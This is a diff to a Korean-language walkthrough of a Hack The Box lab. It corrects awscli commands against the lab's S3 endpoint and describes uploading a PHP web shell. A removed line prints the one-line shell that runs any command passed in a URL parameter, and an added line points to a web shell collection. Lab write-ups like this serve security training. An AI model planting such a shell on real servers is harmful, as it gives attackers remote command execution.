@@ -147,7 +147,7 @@ Could not connect to the endpoint URL: "https://s3.thetoppers.amazonaws.com/s3.t
 명령어 인자를 아래와 같이 변경 후 접근 시 성공적으로 접근 된다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
-└─# aws aws s3 --endpoint=http://s3.thetoppers.htb ls
+└─# aws s3 --endpoint=http://s3.thetoppers.htb ls
 
 2024-02-15 03:33:23 thetoppers.htb
 ```
@@ -175,17 +175,13 @@ Could not connect to the endpoint URL: "https://s3.thetoppers.amazonaws.com/s3.t
 2024-02-15 05:38:02      64347 mem3.jpg
 ```
 
-그렇다면 awscli로 웹쉘을 업로드하여 동작시켜보고자 한다. 웹쉘의 코드는 아래와 같다.
-``` bash
-┌──(root㉿kali)-[/home/]
-└─# cat cmd.php
-<?php system($_GET['cmd']); ?>
-```
+그렇다면 awscli로 웹쉘을 업로드하여 동작시켜보고자 한다. 웹쉘은 아래의 경로에서 선택하여 cmd.php라는 이름으로 저장하였다.
+> https://github.com/cspshivam/webshells
 
 아래는 기존에 존재하던 index.php를 다운로드하고, 내가 작성한 cmd.php를 갖은 경로에 업로드 하는 과정이다. `aws s3 --endpoint=http://s3.thetoppers.htb ls`로 수집한 경로 `thetoppers.htb`에 대해 아래와 같이 접근해야한다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
-└─# aws aws s3 --endpoint=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php ./index.php
+└─# aws s3 --endpoint=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php ./index.php
 
 download: s3://thetoppers.htb/index.php to ./index.php
 
